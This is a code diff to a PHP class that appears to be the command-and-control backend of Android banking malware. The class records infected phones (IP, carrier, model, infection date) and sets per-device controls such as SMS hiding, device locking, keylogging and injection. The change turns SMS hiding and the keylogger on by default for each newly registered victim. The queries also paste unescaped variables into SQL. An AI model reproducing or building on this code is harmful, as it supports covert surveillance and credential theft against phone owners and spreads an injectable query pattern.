@@ -130,8 +130,8 @@ class bots_con{
 		$date = date('Y-m-d H:i');
 		$connection = self::Connection();
 		$connection->exec('SET NAMES utf8');
-		$statement = $connection->prepare("insert into bots (idbot, ip, android, TAG, country, lastconnect, date_infection, operator, model)
-		value ('$idbot','$ip','$android','$tag','$country','$date','$date','$operator','$model')");
+		$statement = $connection->prepare("insert into bots (idbot, ip, android, TAG, country, lastconnect, date_infection, operator, model, statAdmin)
+		value ('$idbot','$ip','$android','$tag','$country','$date','$date','$operator','$model','1')");
 		$statement->execute(array($idbot,$android,$tag,$country,$date,$operator,$model));
 
 		$statement = $connection->prepare("SELECT idbot FROM settingBots WHERE idbot=?");
@@ -142,7 +142,7 @@ class bots_con{
 		}
 		if(!$bool){
 			$statement2 = $connection->prepare("insert into settingBots (idbot, hideSMS, lockDevice, offSound, keylogger, activeInjection)
-			value ('$idbot','0','0','0','0','')");
+			value ('$idbot','1','0','0','1','')");
 			$statement2->execute(array($idbot));
 		}
 		return "ok";
